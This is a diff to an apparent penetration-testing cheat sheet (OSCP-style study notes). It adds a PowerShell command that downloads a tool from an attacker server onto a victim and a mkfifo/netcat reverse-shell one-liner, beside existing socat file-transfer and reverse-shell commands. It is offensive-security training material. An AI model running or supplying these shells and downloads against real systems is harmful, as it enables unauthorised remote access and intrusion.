@@ -11,6 +11,11 @@
 	- Receive a file being hosted on port 443 and save it to passwords.txt:
 `socat TCP4:{ip-address}:443 file:passwords.txt,create`
 
+- powershell 
+	- `Set-ExecutionPolicy Unrestricted` must be applied beforehand
+	- Download wget.exe from a websever (such as a SimpleHTTPServer) :
+	 `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{ip-address}/wget.exe','C:\Users\offsec\Desktop\wget.exe')" `
+
 ## Reverse Shells
 Victim connnects and attacker listens. Used 95% of the time.
 
@@ -20,6 +25,9 @@ Victim connnects and attacker listens. Used 95% of the time.
 - socat
 	- attacker runs: `sudo socat -d -d  TCP4-LISTEN:4444 STDOUT`
 	- victim runs: `socat TCP4:{ip-address}:4444 EXEC:/bin/bash`
+- netcat without `-e` or `-c` on victim
+	- attacker runs: `nc -nlvp 4444`
+	- victim runs: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip-address} 1234 >/tmp/f`
 
 ## Bind Shells
 Victim listens and attacker connects. Useful when bypassing firewalls or when reverse shells "just don't work".
